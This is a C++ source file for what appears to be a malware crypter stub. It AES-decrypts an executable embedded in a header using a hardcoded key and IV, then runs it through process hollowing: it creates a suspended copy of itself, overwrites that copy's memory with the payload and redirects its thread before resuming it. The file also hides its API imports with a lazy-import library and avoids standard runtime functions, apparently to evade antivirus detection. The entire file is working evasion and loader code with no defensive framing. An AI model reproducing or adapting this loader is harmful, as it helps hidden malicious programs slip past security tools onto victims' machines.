// sussy baka.cpp : Définit le point d'entrée de l'application.
//

#include <windows.h>
// the header that contains our encrypted executable file (works with 32 bit ones only)
#include "header1.h"
// https://github.com/JustasMasiulis/lazy_importer
#include "lazy_importer.hpp"
// https://github.com/kokke/tiny-AES-c
#include "aes.hpp"


  

#pragma function(memcpy, memset)



#define ALIGNMENT 8 // must be a power of 2
#define ALIGN(size) (((size) + (ALIGNMENT-1)) & ~(ALIGNMENT-1))
#define SIZE_T_SIZE (ALIGN(sizeof(size_t))) // header size

//custom implementation of memset and memcpy to avoid dependency on the default libraries

void* memset2(void* DestInit, int Source, size_t Size)
{
    unsigned char* Dest = (unsigned char*)DestInit;
    while (Size--) *Dest++ = (unsigned char)Source;

    return(DestInit);
}

void* memcpy2(void* DestInit, void const* SourceInit, size_t Size)
{
    unsigned char* Source = (unsigned char*)SourceInit;
    unsigned char* Dest = (unsigned char*)DestInit;
    while (Size--) *Dest++ = *Source++;

    return(DestInit);
}
#define ECB 1

//function to run our exe from another instance of ourselves
void RunFromMemory(char* pImage, char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFOA peStartUpInformation;
    CONTEXT pContext;

    
    char* pFile;
    memcpy2(&IDH, pImage, sizeof(IDH));
    memcpy2(&INH, (void*)((DWORD)pImage + IDH.e_lfanew), sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    auto pMemory = reinterpret_cast<char*>(LI_FN(LocalAlloc)(LMEM_FIXED, dwImageSize));
    memset2(pMemory, 0, dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy2(Sections, (char*)(firstSection), sizeof(IMAGE_SECTION_HEADER) * INH.FileHeader.NumberOfSections);

    memcpy2(pFile, pImage, dwHeader);

    if ((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment) == 0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for (dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy2(pFile, (char*)(pImage + Sections[dwSectionCount].PointerToRawData), dwSectionSize);

        if ((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment) == 0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }

    
    memset2(&peStartUpInformation, 0, sizeof(STARTUPINFO));
    memset2(&peProcessInformation, 0, sizeof(PROCESS_INFORMATION));
    memset2(&pContext, 0, sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    LI_FN(CreateProcessA)(nullptr, pPath, nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &peStartUpInformation, &peProcessInformation);
    

    DWORD sss = 0;
  
        
        pContext.ContextFlags = CONTEXT_FULL;
        LI_FN(GetThreadContext)(peProcessInformation.hThread, &pContext);   
        LI_FN(VirtualProtectEx)(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), dwImageSize, PAGE_EXECUTE_READWRITE, &previousProtection);  
       LI_FN(WriteProcessMemory)(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), pMemory, dwImageSize, &dwWritten);
       LI_FN(WriteProcessMemory)(peProcessInformation.hProcess, (void*)((DWORD)pContext.Ebx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        LI_FN(SetThreadContext)(peProcessInformation.hThread, &pContext);
        LI_FN(VirtualProtectEx)(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), dwImageSize, previousProtection, nullptr);
        LI_FN(ResumeThread)(peProcessInformation.hThread);
    
  
}
//check if we are running on a 64 bit system. if not the case, the code will continue after the wow64enablewow64fsredirection function. this is mainly to prevent our application from crashing on 32 bit systems.
BOOL DisableWowRedirection() {
    SYSTEM_INFO si;
    LI_FN(GetSystemInfo)(&si);

    if ((si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_IA64) || (si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_AMD64) == 64)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}



int main() {
    
	LI_FN(SetErrorMode)(SEM_NOGPFAULTERRORBOX);
  // disable the wow64 filesystem redirection to make sure that we can still execute ourselves even if we are in a 64 bit directory (like the actual system32 folder)
    if (DisableWowRedirection() == TRUE) {
        LI_FN(Wow64EnableWow64FsRedirection)(FALSE);
    }
    
    char me[MAX_PATH];
	
	LI_FN(GetModuleFileNameA)(nullptr, me, MAX_PATH);
    //size of our encrypted exe
    SIZE_T shellcodeSize = sizeof(rawData);
    // The key and the initialization vector MUST be the same as the one in the winapp project to work.
    unsigned char key[] = "qwertyuiopasdfghjklzxcvbnmqwerty";
    unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key , iv);
    AES_CBC_decrypt_buffer(&ctx, rawData, shellcodeSize);
//actually run our executable
    RunFromMemory(reinterpret_cast<char*>(rawData), me);

}



